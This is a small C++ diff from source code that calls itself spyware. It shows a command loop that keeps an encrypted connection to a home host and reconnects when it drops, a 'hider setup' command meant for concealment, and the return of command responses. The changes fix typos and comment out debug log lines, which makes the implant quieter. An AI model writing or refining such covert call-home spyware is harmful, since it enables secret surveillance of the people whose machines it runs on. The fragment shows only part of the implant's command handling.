@@ -53,7 +53,7 @@ int main() {
                 std::cerr << "Maneger: cannot send responce, something wrong\n";
             }
         }
-        std::cerr << "spyware: compleated loop iter\n";
+        std::cerr << "spyware: completed loop iter\n";
         try {
             if (conn->checkShutdown()) {
                 if (EncSocketConnection::connectEncTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
@@ -109,9 +109,9 @@ void loopIter(std::shared_ptr<EncSocketConnection> conn, HiderManeger& hiderMane
         std::exit(EXIT_SUCCESS);
     
     case HIDER_SETUP:
-        std::cerr << "start  hider setup\n";
+        // std::cerr << "start  hider setup\n";
         stat = hiderManeger.setUpHider(cmd.strParam);
-        std::cerr << "finnsh  hider setup\n";
+        // std::cerr << "finnsh  hider setup\n";
         break;
     }
 
@@ -122,5 +122,5 @@ void loopIter(std::shared_ptr<EncSocketConnection> conn, HiderManeger& hiderMane
     // conn->flushInput();
     std::cerr << "Spyware:  Conn: res-" << stat << "\nresponse-" << strRes << std::endl;
     conn->sendResponce(stat, strRes);
-    std::cerr << "Spyware: responce sent" << std::endl;
+    // std::cerr << "Spyware: responce sent" << std::endl;
 }
